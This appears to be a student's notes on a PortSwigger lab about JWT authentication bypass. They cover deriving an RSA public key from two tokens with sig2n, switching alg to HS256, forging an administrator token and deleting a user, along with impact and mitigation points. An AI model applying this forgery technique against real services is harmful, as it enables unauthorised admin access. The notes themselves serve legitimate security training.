# Lab08 - JWT Authentication Bypass Via Algorithm Confusion With No Exposed Key

## Objective

Derive the server's RSA public key using two JWTs.

Forge a JWT granting administrator access.

Delete:

```text
carlos
```

Credentials:

```text
wiener:peter
```

---

# Vulnerability Overview

The public key is not exposed.

Instead, it can be derived from two JWTs using:

```text
sig2n
```

---

# Attack Flow

```text
Capture JWT 1
        ↓
Capture JWT 2
        ↓
Run sig2n
        ↓
Recover Candidate Public Keys
        ↓
Identify Correct Key
        ↓
Algorithm Confusion
```

---

# Part 1

Log in.

Capture JWT.

Log out.

Log in again.

Capture another JWT.

---

# Part 2

Run:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

The tool generates:

```text
Candidate Public Keys

Forged JWTs
```

Replay each forged JWT until one succeeds.

---

# Part 3

Copy the matching Base64 PEM.

Create:

```text
New Symmetric Key
```

Replace:

```text
k
```

with the Base64 PEM.

---

# Part 4

Modify:

```json
{
   "alg":"HS256"
}
```

Modify:

```json
{
   "sub":"administrator"
}
```

Sign the JWT.

Replay:

```http
GET /admin
```

Delete:

```text
carlos
```

---

# Why It Works

```text
Two JWTs

↓

Recover Public Key

↓

HS256 Confusion

↓

JWT Forged
```

---

# Personal Analysis

Even when the public key isn't directly available:

```text
Can It Be Derived?

Can Algorithm Confusion Still Work?
```

---

# Bug Bounty Indicators

```text
RS256

Multiple JWTs

Algorithm Switching
```

---

# Impact

```text
JWT Forgery

Authentication Bypass

Administrator Access
```

---

# Mitigation

```text
Never Allow Algorithm Switching

Pin RS256

Ignore Client-Supplied alg
```

---

# Related Theory

```text
13-algorithm-confusion-attacks.md

14-deriving-public-keys.md
```

---

# Key Learnings

An exposed public key is not always required—multiple signed JWTs may provide enough information to derive a candidate key for testing in vulnerable implementations.